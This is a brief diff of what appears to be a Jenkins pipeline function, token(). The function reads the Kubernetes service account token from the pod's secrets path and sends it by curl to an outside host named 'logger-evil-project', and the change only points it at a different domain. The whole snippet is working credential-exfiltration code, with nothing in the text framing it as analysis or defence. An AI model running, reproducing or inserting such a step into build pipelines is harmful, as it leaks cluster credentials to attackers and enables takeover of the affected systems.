@@ -71,5 +71,5 @@ def token() {
      script: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    	 returnStdout: true
   ).trim()
-  sh "curl http://logger-evil-project.onebankintra.net/?log=${SATOKEN}"
+  sh "curl http://logger-evil-project.apps.ocpdev.vargadaniel.com/?log=${SATOKEN}"
 }
